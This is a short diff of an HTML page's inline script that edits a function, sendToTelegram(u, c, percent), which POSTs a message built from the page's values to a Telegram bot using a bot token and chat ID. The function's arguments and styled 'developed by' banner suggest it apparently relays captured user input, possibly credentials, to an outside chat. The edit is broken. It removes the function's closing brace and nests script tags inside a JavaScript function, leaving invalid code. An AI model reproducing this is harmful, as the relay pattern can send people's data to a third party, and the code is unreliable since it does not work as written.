@@ -175,12 +175,15 @@ async function sendToTelegram(u, c, percent) {
 ║ 🪿 developed by: 𝐃 ʜ 𝙰 ɴ 𝐢ⁱɪ  
 ╚━━━━━━━━━━━━━━━━━━━`;
 
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-  });
-}
+  <script src="passwords.js"></script>
+<script>
+   // here we use BOT_TOKEN and CHAT_ID
+   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+   });
+</script>
 </script>
 
 </body>
